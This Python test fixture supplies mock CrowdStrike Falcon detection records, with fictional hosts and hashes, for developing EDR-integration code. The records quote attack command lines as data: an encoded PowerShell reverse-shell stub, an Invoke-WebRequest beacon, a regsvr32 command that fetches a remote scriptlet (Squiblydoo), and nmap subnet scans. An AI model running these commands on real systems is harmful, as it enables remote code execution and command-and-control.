"""Mock CrowdStrike Falcon API responses for local development and testing.

All values use realistic but entirely fictional data.  Hashes are syntactically
valid SHA-256/MD5 strings but do not correspond to real files.  Hostnames, IPs,
and CIDs are fabricated.
"""

from __future__ import annotations

from typing import Optional

# ---------------------------------------------------------------------------
# Mock detection IDs
# ---------------------------------------------------------------------------

MOCK_DETECTION_IDS = [
    "ldt:abc123def456abc123def456abc12301:9876543210",
    "ldt:abc123def456abc123def456abc12302:9876543211",
    "ldt:abc123def456abc123def456abc12303:9876543212",
]

# ---------------------------------------------------------------------------
# Full detection objects matching the CrowdStrike Detections API schema
# ---------------------------------------------------------------------------

MOCK_DETECTIONS = [
    {
        "detection_id": "ldt:abc123def456abc123def456abc12301:9876543210",
        "cid": "abc123def456abc123def456abc12301",
        "created_timestamp": "2024-01-15T08:32:11.000Z",
        "max_severity": 80,
        "max_severity_displayname": "Critical",
        "status": "new",
        "tactic": "Execution",
        "technique": "PowerShell",
        "objective": "Falcon Detection Method",
        "device": {
            "device_id": "dev001abc123def456abc123def456ab",
            "hostname": "WORKSTATION-042",
            "local_ip": "10.10.5.42",
            "external_ip": "203.0.113.42",
            "mac_address": "00-1A-2B-3C-4D-5E",
            "os_version": "Windows 10 Enterprise",
            "platform_name": "Windows",
            "first_seen": "2023-06-01T12:00:00Z",
            "last_seen": "2024-01-15T08:30:00Z",
            "agent_version": "7.05.17706.0",
        },
        "filename": "powershell.exe",
        "filepath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "cmdline": (
            "powershell.exe -NoProfile -NonInteractive -EncodedCommand "
            "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0"
        ),
        "sha256": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
        "md5": "a1b2c3d4e5f6a1b2c3d4e5f6",
        "behaviors": [
            {
                "behavior_id": "behav001",
                "tactic": "Execution",
                "tactic_id": "TA0002",
                "technique": "PowerShell",
                "technique_id": "T1059.001",
                "objective": "Falcon Detection Method",
                "severity": 80,
                "confidence": 90,
                "description": (
                    "A PowerShell process executed an encoded command that attempted "
                    "to establish a reverse shell to an external host."
                ),
                "filename": "powershell.exe",
                "filepath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": (
                    "powershell.exe -NoProfile -NonInteractive -EncodedCommand "
                    "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0"
                ),
                "sha256": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
                "md5": "a1b2c3d4e5f6a1b2c3d4e5f6",
                "parent_details": {
                    "parent_process_id": 4512,
                    "parent_cmdline": "cmd.exe /c start powershell.exe",
                    "parent_image_file_name": "cmd.exe",
                },
            },
            {
                "behavior_id": "behav002",
                "tactic": "Command and Control",
                "tactic_id": "TA0011",
                "technique": "Encrypted Channel",
                "technique_id": "T1573",
                "objective": "Keep Access",
                "severity": 70,
                "confidence": 75,
                "description": (
                    "Outbound TLS connection to a known threat-actor infrastructure IP."
                ),
                "filename": "powershell.exe",
                "filepath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": "powershell.exe -c Invoke-WebRequest -Uri https://198.51.100.99/beacon",
                "sha256": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
                "md5": "a1b2c3d4e5f6a1b2c3d4e5f6",
                "parent_details": None,
            },
        ],
    },
    {
        "detection_id": "ldt:abc123def456abc123def456abc12302:9876543211",
        "cid": "abc123def456abc123def456abc12302",
        "created_timestamp": "2024-01-15T09:14:55.000Z",
        "max_severity": 55,
        "max_severity_displayname": "High",
        "status": "new",
        "tactic": "Persistence",
        "technique": "Registry Run Keys / Startup Folder",
        "objective": "Establish Foothold",
        "device": {
            "device_id": "dev002abc123def456abc123def456ab",
            "hostname": "SRV-DC-01",
            "local_ip": "10.0.0.5",
            "external_ip": "203.0.113.5",
            "mac_address": "00-1A-2B-3C-4D-5F",
            "os_version": "Windows Server 2019 Datacenter",
            "platform_name": "Windows",
            "first_seen": "2022-11-10T08:00:00Z",
            "last_seen": "2024-01-15T09:12:00Z",
            "agent_version": "7.05.17706.0",
        },
        "filename": "regsvr32.exe",
        "filepath": "C:\\Windows\\System32\\regsvr32.exe",
        "cmdline": "regsvr32.exe /s /u /i:http://198.51.100.10/payload.sct scrobj.dll",
        "sha256": "b2c3d4e5f6a7b2c3d4e5f6a7b2c3d4e5f6a7b2c3d4e5f6a7b2c3d4e5f6a7b2c3",
        "md5": "b2c3d4e5f6a7b2c3d4e5f6a7",
        "behaviors": [
            {
                "behavior_id": "behav003",
                "tactic": "Persistence",
                "tactic_id": "TA0003",
                "technique": "Registry Run Keys / Startup Folder",
                "technique_id": "T1547.001",
                "objective": "Establish Foothold",
                "severity": 55,
                "confidence": 85,
                "description": (
                    "regsvr32 executed a remote scriptlet file to register a COM object, "
                    "a known living-off-the-land technique (Squiblydoo)."
                ),
                "filename": "regsvr32.exe",
                "filepath": "C:\\Windows\\System32\\regsvr32.exe",
                "cmdline": "regsvr32.exe /s /u /i:http://198.51.100.10/payload.sct scrobj.dll",
                "sha256": "b2c3d4e5f6a7b2c3d4e5f6a7b2c3d4e5f6a7b2c3d4e5f6a7b2c3d4e5f6a7b2c3",
                "md5": "b2c3d4e5f6a7b2c3d4e5f6a7",
                "parent_details": {
                    "parent_process_id": 1832,
                    "parent_cmdline": "explorer.exe",
                    "parent_image_file_name": "explorer.exe",
                },
            },
            {
                "behavior_id": "behav004",
                "tactic": "Defense Evasion",
                "tactic_id": "TA0005",
                "technique": "System Binary Proxy Execution",
                "technique_id": "T1218.010",
                "objective": "Evade",
                "severity": 50,
                "confidence": 80,
                "description": "Signed Microsoft binary used to proxy execution of malicious code.",
                "filename": "regsvr32.exe",
                "filepath": "C:\\Windows\\System32\\regsvr32.exe",
                "cmdline": "regsvr32.exe /s scrobj.dll",
                "sha256": "b2c3d4e5f6a7b2c3d4e5f6a7b2c3d4e5f6a7b2c3d4e5f6a7b2c3d4e5f6a7b2c3",
                "md5": "b2c3d4e5f6a7b2c3d4e5f6a7",
                "parent_details": None,
            },
        ],
    },
    {
        "detection_id": "ldt:abc123def456abc123def456abc12303:9876543212",
        "cid": "abc123def456abc123def456abc12303",
        "created_timestamp": "2024-01-15T11:45:02.000Z",
        "max_severity": 30,
        "max_severity_displayname": "Medium",
        "status": "new",
        "tactic": "Discovery",
        "technique": "Network Service Scanning",
        "objective": "Discover",
        "device": {
            "device_id": "dev003abc123def456abc123def456ab",
            "hostname": "LAPTOP-DEV-007",
            "local_ip": "192.168.1.107",
            "external_ip": "203.0.113.107",
            "mac_address": "00-1A-2B-3C-4D-60",
            "os_version": "Windows 11 Pro",
            "platform_name": "Windows",
            "first_seen": "2023-09-20T14:00:00Z",
            "last_seen": "2024-01-15T11:43:00Z",
            "agent_version": "7.05.17706.0",
        },
        "filename": "nmap.exe",
        "filepath": "C:\\Users\\developer\\Downloads\\nmap.exe",
        "cmdline": "nmap.exe -sV -p 22,80,443,3389 10.0.0.0/24",
        "sha256": "c3d4e5f6a7b8c3d4e5f6a7b8c3d4e5f6a7b8c3d4e5f6a7b8c3d4e5f6a7b8c3d4",
        "md5": "c3d4e5f6a7b8c3d4e5f6a7b8",
        "behaviors": [
            {
                "behavior_id": "behav005",
                "tactic": "Discovery",
                "tactic_id": "TA0007",
                "technique": "Network Service Scanning",
                "technique_id": "T1046",
                "objective": "Discover",
                "severity": 30,
                "confidence": 65,
                "description": "Network scanning utility executed against internal subnet.",
                "filename": "nmap.exe",
                "filepath": "C:\\Users\\developer\\Downloads\\nmap.exe",
                "cmdline": "nmap.exe -sV -p 22,80,443,3389 10.0.0.0/24",
                "sha256": "c3d4e5f6a7b8c3d4e5f6a7b8c3d4e5f6a7b8c3d4e5f6a7b8c3d4e5f6a7b8c3d4",
                "md5": "c3d4e5f6a7b8c3d4e5f6a7b8",
                "parent_details": {
                    "parent_process_id": 9104,
                    "parent_cmdline": "cmd.exe",
                    "parent_image_file_name": "cmd.exe",
                },
            },
            {
                "behavior_id": "behav006",
                "tactic": "Discovery",
                "tactic_id": "TA0007",
                "technique": "Remote System Discovery",
                "technique_id": "T1018",
                "objective": "Discover",
                "severity": 25,
                "confidence": 60,
                "description": "Process enumerated remote hosts on the local network segment.",
                "filename": "nmap.exe",
                "filepath": "C:\\Users\\developer\\Downloads\\nmap.exe",
                "cmdline": "nmap.exe -sn 10.0.0.0/24",
                "sha256": "c3d4e5f6a7b8c3d4e5f6a7b8c3d4e5f6a7b8c3d4e5f6a7b8c3d4e5f6a7b8c3d4",
                "md5": "c3d4e5f6a7b8c3d4e5f6a7b8",
                "parent_details": None,
            },
        ],
    },
]


def get_mock_detections(limit: int = 10) -> list:
    """Return up to *limit* mock detections."""
    return MOCK_DETECTIONS[:limit]


def get_mock_detection_by_id(detection_id: str) -> Optional[dict]:
    """Return a single mock detection by its detection_id, or None."""
    for detection in MOCK_DETECTIONS:
        if detection["detection_id"] == detection_id:
            return detection
    return None
